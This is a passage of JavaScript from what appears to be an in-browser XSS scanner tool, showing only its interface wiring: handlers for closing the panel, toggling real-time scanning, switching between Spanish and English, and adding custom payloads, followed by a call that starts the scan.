    if (confirm(TRADUCCIONES[idioma].idioma === "es" ? "¿Cerrar el panel de escáner XSS?" : "Close the XSS scanner panel?")) {
      detenerEscaneoTiempoReal();
      panel.remove();
    }
  };

  document.getElementById("realTimeToggle").onchange = (e) => {
    realTimeScanning = e.target.checked;
    if (realTimeScanning) {
      iniciarEscaneoTiempoReal();
    } else {
      detenerEscaneoTiempoReal();
    }
  };

  document.getElementById("languageSelect").onchange = (e) => {
    idioma = e.target.value;
    actualizarInterfaz();
  };

  document.getElementById("customPayload").onchange = (e) => {
    const payload = e.target.value.trim();
    if (payload && !CUSTOM_PAYLOADS.includes(payload)) {
      CUSTOM_PAYLOADS.push(payload);
      logResultado("info", "Payload Personalizado", `${TRADUCCIONES[idioma].payloadAdded}: ${escapeHtml(payload)}`);
      e.target.value = "";
    }
  };

  // Iniciar el escaneo automáticamente
  iniciarEscaneo();
})();
